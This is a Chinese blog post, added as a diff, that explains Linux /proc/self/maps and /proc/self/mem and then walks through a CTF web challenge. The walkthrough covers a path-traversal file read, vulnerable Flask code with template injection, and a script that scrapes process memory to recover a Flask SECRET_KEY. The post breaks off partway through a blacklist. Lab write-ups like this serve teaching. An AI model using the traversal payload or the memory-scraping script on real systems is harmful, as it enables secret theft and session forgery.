@@ -1,0 +1,312 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>proc目录self下的maps&amp;&amp;mem | Tranquility</title><meta name="keywords" content="proc目录self下的maps&amp;&amp;mem"><meta name="author" content="LIKE"><meta name="copyright" content="LIKE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="&#x2F;proc&#x2F;self&#x2F;maps &amp;&amp; &#x2F;proc&#x2F;self&#x2F;mem概述： 在Linux系统中，**&#x2F;proc&#x2F;self&#x2F;maps是一个特殊文件，它提供了当前进程的内存映射信息。** 在Linux中，&#x2F;proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。&#x2F;proc&#x2F;self是一个符号链接，指向当前正在执行的进程的目录。因此，**&#x2F;proc&#x2F;self&#x2F;maps实际上指向了当">
+<meta property="og:type" content="article">
+<meta property="og:title" content="proc目录self下的maps&amp;&amp;mem">
+<meta property="og:url" content="https://leekoscn.github.io/posts/c66216d2b920/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="&#x2F;proc&#x2F;self&#x2F;maps &amp;&amp; &#x2F;proc&#x2F;self&#x2F;mem概述： 在Linux系统中，**&#x2F;proc&#x2F;self&#x2F;maps是一个特殊文件，它提供了当前进程的内存映射信息。** 在Linux中，&#x2F;proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。&#x2F;proc&#x2F;self是一个符号链接，指向当前正在执行的进程的目录。因此，**&#x2F;proc&#x2F;self&#x2F;maps实际上指向了当">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leekoscn.github.io/img/hello-world.webp">
+<meta property="article:published_time" content="2023-08-22T10:05:22.573Z">
+<meta property="article:modified_time" content="2023-06-05T06:42:12.203Z">
+<meta property="article:author" content="LIKE">
+<meta property="article:tag" content="proc目录self下的maps&amp;&amp;mem">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leekoscn.github.io/img/hello-world.webp"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://leekoscn.github.io/posts/c66216d2b920/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: LIKE","link":"链接: ","source":"来源: Tranquility","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'proc目录self下的maps&&mem',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-06-05 14:42:12'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/cursor.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/hexo-electric-clock@1.0.6/clock.css"><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">215</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">107</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">31</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/hello-world.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tranquility</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">proc目录self下的maps&amp;&amp;mem</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-22T10:05:22.573Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-05T06:42:12.203Z" title="更新于 2023-06-05 14:42:12">2023-06-05</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="proc目录self下的maps&amp;&amp;mem"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="proc-self-maps-amp-amp-proc-self-mem"><a href="#proc-self-maps-amp-amp-proc-self-mem" class="headerlink" title="/proc/self/maps &amp;&amp; /proc/self/mem"></a>/proc/self/maps &amp;&amp; /proc/self/mem</h2><h3 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h3><blockquote>
+<p>在Linux系统中，**/proc/self/maps<strong>是一个特殊文件，它</strong>提供了当前进程的内存映射信息。**</p>
+<p>在Linux中，/proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。/proc/self是一个符号链接，指向当前正在执行的进程的目录。因此，**/proc/self/maps实际上指向了当前进程的内存映射信息。**</p>
+<p>该文件包含了当前进程的内存映射区域的详细信息，包括<strong>起始地址、结束地址、访问权限、偏移量、设备号、文件路径</strong>等。每一行对应于一个内存映射区域，</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2023/05/25/QvDOrbZW98y2Lx1.png" alt="image-20230525021902703"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">55bac9dcb000-55bac9dcd000 r--p 00000000 08:01 533672                     /usr/bin/cat </span><br></pre></td></tr></table></figure>
+
+<p>代表什么意思</p>
+<ul>
+<li><code>55bac9dcb000-55bac9dcd000</code>: 这是内存区域的起始地址和结束地址。该区域从0x55bac9dcb000到0x55bac9dcd000。</li>
+<li><code>r--p</code>: 这表示内存区域的访问权限。在这种情况下，该区域只允许读取（read）操作。</li>
+<li><code>00000000</code>: 这是该内存区域在文件中的偏移量。在这种情况下，偏移量为0。</li>
+<li><code>08:01</code>: 这是指与该内存区域相关联的设备号和节点号。设备号为08，节点号为01。</li>
+<li><code>/usr/bin/cat</code>: 这是映射到该内存区域的文件的路径。在这种情况下，该区域是由<code>/usr/bin/cat</code>文件映射而来。</li>
+</ul>
+<p>综上所述，该行表示了一个只读权限的内存区域，它是由<code>/usr/bin/cat</code>文件映射而来。</p>
+</blockquote>
+<p>根据上面的描述， <code>/proc/self/maps</code>记录了当前进程的内存映射的相关信息，根据这些信息我们可以找到对应的内存空间</p>
+<blockquote>
+<p>在Linux系统中，**/proc/self/mem<strong>是一个特殊文件，它提供了</strong>对当前进程内存的直接访问。**</p>
+<p>在Linux中，/proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。/proc/self是一个符号链接，指向当前正在执行的进程的目录。因此，/proc/self/mem实际上指向了当前进程的内存。</p>
+<p>通过读取和写入/proc/self/mem文件，可以直接对当前进程的内存进行操作。这包括读取和修改进程的内存内容，可以用于调试、分析或修改进程的运行时状态。</p>
+<p>但是需要注意的是，/proc/self/mem文件的访问权限通常非常受限制。只有具有足够权限的用户或特权进程才能访问该文件。此外，对于一个普通的应用程序来说，直接读取或写入/proc/self/mem文件通常是不必要且危险的操作。</p>
+</blockquote>
+<p>我们也知道了 <code>/proc/self/mem</code> 文件 ，可以对当前进程内存进行访问。</p>
+<p>总结一下，就是根据 <code>/proc/self/maps</code>提供的内存地址映射信息找到 <code>/proc/self/mem</code>相应的内存块</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="Cute-Cirno-amp-Cute-Cirno-Revenge"><a href="#Cute-Cirno-amp-Cute-Cirno-Revenge" class="headerlink" title="Cute Cirno &amp; Cute Cirno (Revenge)"></a>Cute Cirno &amp; Cute Cirno (Revenge)</h4><h5 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h5><p>首先查看源码：</p>
+<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://raw.githubusercontent.com/leekosss/photoBed/master/202305250159353.png" alt="image-20230525015929206" style="zoom:33%;" />
+
+<p>发现一个读文件的路由，根据数据包可知，这是python编写的</p>
+<blockquote>
+<p>在Linux系统中，**/proc/self/cmdline<strong>是一个特殊的文件，它</strong>提供了当前进程的命令行参数信息。**</p>
+<p>在Linux中，/proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。**/proc/self是一个符号链接，它指向当前正在执行的进程的目录<strong>。因此，</strong>/proc/self/cmdline实际上指向了当前进程的命令行参数信息。**</p>
+</blockquote>
+<p>我们读取 <code>/proc/self/cmdline</code> 获取命令行信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://neepusec.fun:28912/r3aDF1le?filename=../../../proc/self/cmdline</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./raw.githubusercontent.com/leekosss/photoBed/master/202305250204341.png" alt="image-20230525020423295"></p>
+<p>返回了一个文件路径，有一个<code>CuteCirno.py</code>文件</p>
+<p>当我们访问一个不存在的路径时</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2023/05/25/HD4cxYlkut65Fd8.png" alt="image-20230525020627713"></p>
+<p>我们发现报错了，于是读取这两个文件：</p>
+<p>CuteCirno.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, render_template_string</span><br><span class="line"><span class="keyword">import</span> os, base64</span><br><span class="line"><span class="keyword">from</span> NeepuFile <span class="keyword">import</span> neepu_files</span><br><span class="line"></span><br><span class="line">CuteCirno = Flask(__name__,</span><br><span class="line">                  static_url_path=<span class="string">&#x27;/static&#x27;</span>,</span><br><span class="line">                  static_folder=<span class="string">&#x27;static&#x27;</span></span><br><span class="line">                  )</span><br><span class="line"></span><br><span class="line">CuteCirno.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(base64.b64encode(os.urandom(<span class="number">30</span>)).decode()) + <span class="string">&quot;*NeepuCTF*&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@CuteCirno.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>():</span><br><span class="line">    session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;welcome.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@CuteCirno.route(<span class="params"><span class="string">&#x27;/Cirno&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;CleverCirno.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@CuteCirno.route(<span class="params"><span class="string">&#x27;/r3aDF1le&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_read</span>():</span><br><span class="line">    filename = <span class="string">&quot;static/text/&quot;</span> + request.args.get(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;comment.txt&#x27;</span>)</span><br><span class="line">    start = request.args.get(<span class="string">&#x27;start&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    end = request.args.get(<span class="string">&#x27;end&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> neepu_files(filename, start, end)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@CuteCirno.route(<span class="params"><span class="string">&#x27;/genius&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&#x27;admin&#x27;</span>))</span><br><span class="line">        answer = request.args.get(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> answer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            blacklist = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>,</span><br><span class="line">                         <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;namespace&#x27;</span>,<span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;base&#x27;</span>,</span><br><span class="line">                         <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;00&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;import&#x27;</span>,</span><br><span class="line">                         <span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;=&#x27;</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> answer:</span><br><span class="line">                    answer = <span class="string">&quot;⑨&quot;</span> +<span class="string">&quot;&quot;&quot;&lt;/br&gt;&lt;img src=&quot;static/woshibaka.jpg&quot; width=&quot;300&quot; height=&quot;300&quot; alt=&quot;Cirno&quot;&gt;&quot;&quot;&quot;</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> answer == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;你能告诉聪明的⑨, 1+1的answer吗&quot;</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;1+1=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(answer))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;mathclass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;你真的是我的马斯塔吗？&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    CuteCirno.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>观察一下这个文件，发现 <code>SECRET_KEY</code> 是使用随机数生成的</p>
+<p><code>/genius</code>路由会检查session，所以这一题需要我们伪造session，然后绕过过滤进行ssti</p>
+<p>NeepuFile.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">neepu_files</span>(<span class="params">filename, start=<span class="number">0</span>, end=<span class="number">0</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        start = <span class="built_in">int</span>(start)</span><br><span class="line">        end = <span class="built_in">int</span>(end)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        end = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> filename != <span class="string">&quot;&quot;</span> <span class="keyword">and</span> os.access(filename, os.R_OK):</span><br><span class="line">        f = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> start &gt;= <span class="number">0</span>:</span><br><span class="line">            f.seek(start) <span class="comment"># 将文件指针移动到start位置</span></span><br><span class="line">            <span class="keyword">if</span> end &gt;= start <span class="keyword">and</span> end != <span class="number">0</span>:</span><br><span class="line">                data = f.read(end - start)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data = f.read()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = f.read()</span><br><span class="line"></span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = (<span class="string">&quot;File `%s` not exist or can not be read&quot;</span> % filename).encode()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
+
+<p>该文件是用来读取文件内容的，并且可以指定读取的起始地址</p>
+<p>然后我们需要思考突破点，我们怎样才能得到key呢，这个是随机产生的，我们不可能猜出来。</p>
+<p>由于我们不知道key，但是由于程序在运行时，会将部分信息存入内存中，所以我们只需要找到内存中带有： <code>*NeepuCTF*</code> 字样的字符串取出来就是<code>SECRET_KEY</code>了</p>
+<p>我们编写脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding = utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2023/5/24 23:32</span></span><br><span class="line"><span class="comment"># @Author : Leekos</span></span><br><span class="line"><span class="comment"># @File : cute.py</span></span><br><span class="line"><span class="comment"># @Software : PyCharm</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://neepusec.fun:28912/r3aDF1le?filename=../../../&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">maps</span>():</span><br><span class="line"></span><br><span class="line">    req = requests.get(url=url + <span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">    text = req.text</span><br><span class="line">    ls = text.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    pattern = <span class="string">&quot;([0-9a-z]+)-([0-9a-z]+) rw&quot;</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> ls:</span><br><span class="line">        map_addr = re.<span class="keyword">match</span>(pattern,l) </span><br><span class="line">        <span class="keyword">if</span> map_addr:</span><br><span class="line">            <span class="comment"># print(map_addr.group(1),&quot;-&quot;,map_addr.group(2))</span></span><br><span class="line">            start = <span class="built_in">int</span>(map_addr.group(<span class="number">1</span>), <span class="number">16</span>) <span class="comment">#group(1)会得到匹配到的字符串的第1个值，模式串中第1个大括号匹配到的</span></span><br><span class="line">            end = <span class="built_in">int</span>(map_addr.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">            mem_url = url + <span class="string">&quot;/proc/self/mem&amp;start=&quot;</span>+<span class="built_in">str</span>(start)+<span class="string">&quot;&amp;end=&quot;</span>+<span class="built_in">str</span>(end)</span><br><span class="line">            requ = requests.get(url=mem_url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;*NeepuCTF*&quot;</span> <span class="keyword">in</span> requ.text:</span><br><span class="line">                mem_pattern = <span class="string">b&quot;[A-Za-z0-9+/=]&#123;40&#125;\*NeepuCTF\*&quot;</span></span><br><span class="line">                key = re.findall(mem_pattern, requ.content) <span class="comment"># 内存有很多不可打印字符，所以使用字节形式</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Secret Key: &quot;</span> + <span class="built_in">bytes</span>.decode(key[<span class="number">0</span>])) <span class="comment"># 将字节解码为字符串</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    maps()</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>解释一下这个脚本的意思：</p>
+<p>首先获得maps文件的值，然后分隔成列表，进行遍历。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pattern = <span class="string">&quot;([0-9a-z]+)-([0-9a-z]+) rw&quot;</span></span><br><span class="line"><span class="comment"># 匹配maps中有读写权限rw的字符串</span></span><br></pre></td></tr></table></figure>
+
+<p>当匹配到时，if条件为真，将group(1)、group(2)分别转为10进制（代表内存的首末地址）</p>
+<p>然后根据地址读取mem文件的值，如果内存中包含指定字符串就打印出key</p>
+</blockquote>
+<p>然后我们就可以进行session伪造了，但是由于等会需要进行ssti(但是过滤了很多)</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;namespace&#x27;</span>,<span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;base&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;00&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;import&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span 